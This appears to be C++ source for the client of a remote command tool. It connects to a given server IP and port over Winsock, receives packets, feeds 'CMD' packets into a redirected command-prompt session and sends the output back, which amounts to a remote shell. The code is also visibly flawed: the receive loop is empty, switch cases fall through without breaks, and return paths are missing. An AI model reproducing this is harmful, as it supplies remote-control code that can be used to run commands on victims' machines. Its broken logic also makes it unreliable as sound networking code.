#include "client.h"
#include "general.h"
#include "cmdRedirect.h"

void Client::ClientThread()
{
	while (clientptr->connected)
	{
		//process packets
	}

	if (clientptr->CloseConnection()) //Try to close socket connection..., If connection socket was closed properly
	{

	}
	else //If connection socket was not closed properly for some reason from our function
	{

	}
}

enum Client::PacketType
{
	P_Instruction,
	P_CMDCommand
};

bool Client::ReceivePacket()
{
	PacketType packettype;
	recv(sConnection, (char*)&packettype, sizeof(PacketType), NULL);	//receive packet type
	ProcessPacket(packettype);
	return true;
}

bool Client::ProcessPacket(PacketType _packettype)
{
	int bufferlength;
	recv(sConnection, (char*)&bufferlength, sizeof(int), NULL);		//receive packet length
	char* buffer = new char[bufferlength + 1];	//Allocate buffer
	buffer[bufferlength] = '\0';	//Set last character of buffer to be a null terminator so we aren't printing memory that we shouldn't be looking at
	recv(sConnection, buffer, bufferlength, NULL);	//receive message

	switch (_packettype)
	{
	case PacketType::P_Instruction:
	{
		General::processCommand(buffer);
	}
	case PacketType::P_CMDCommand:
	{
		if (CMD::cmdptr != NULL)
		{
			CMD::cmdptr->writeCMD(buffer);
			sendPacket(CMD::cmdptr->readCMD(), PacketType::P_CMDCommand);
		}
		else
		{
			General::sendError("Initiate a CMD session first.");
		}
	}
	default:
		delete[] buffer;
		return false;
	}

	delete[] buffer;
}

bool Client::sendPacket(std::string message, PacketType _PacketType)
{
	if (send(sConnection, (char*)&_PacketType, sizeof(PacketType), NULL) == SOCKET_ERROR)
	{
		General::sendError("Error sending Packet: Error sending Type");
		return false;
	}
	int bufferlength = message.size();
	if (send(sConnection, (char*)&bufferlength, sizeof(int), NULL) == SOCKET_ERROR)
	{
		General::sendError("Error sending Packet: Error sending size");
		return false;
	}
	if (send(sConnection, message.c_str(), bufferlength, NULL) == SOCKET_ERROR)
	{
		General::sendError("Error sending Packet: Error sending message");
		return false;
	}
	return true;

}

Client::Client(std::string IP, int PORT)
{
	//Winsock Startup
	WSAData wsaData;
	WORD DllVersion = MAKEWORD(2, 2);
	if (WSAStartup(DllVersion, &wsaData) != 0)
	{
		MessageBoxA(NULL, "Winsock startup failed", "Error", MB_OK | MB_ICONERROR);
		exit(0);
	}

	addr.sin_addr.s_addr = inet_addr(IP.c_str()); //Address (127.0.0.1) = localhost (this pc)
	addr.sin_port = htons(PORT); //Port 
	addr.sin_family = AF_INET; //IPv4 Socket
	clientptr = this; //Update ptr to the client which will be used by our client thread
}

bool Client::Connect()
{
	sConnection = socket(AF_INET, SOCK_STREAM, NULL); //Set Connection socket
	if (connect(sConnection, (SOCKADDR*)&addr, sizeof(addr)) != 0) //If we are unable to connect...
	{
		return false;
	}

	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ClientThread, NULL, NULL, NULL); //Create the client thread that will receive any data that the server sends.
	return true;
}

bool Client::CloseConnection()
{
	if (closesocket(sConnection) == SOCKET_ERROR)
	{
		if (WSAGetLastError() == WSAENOTSOCK) //If socket error is that operation is not performed on a socket (This happens when the socket has already been closed)
			return true; //return true since connection has already been closed

		return false;
	}
	return true;
}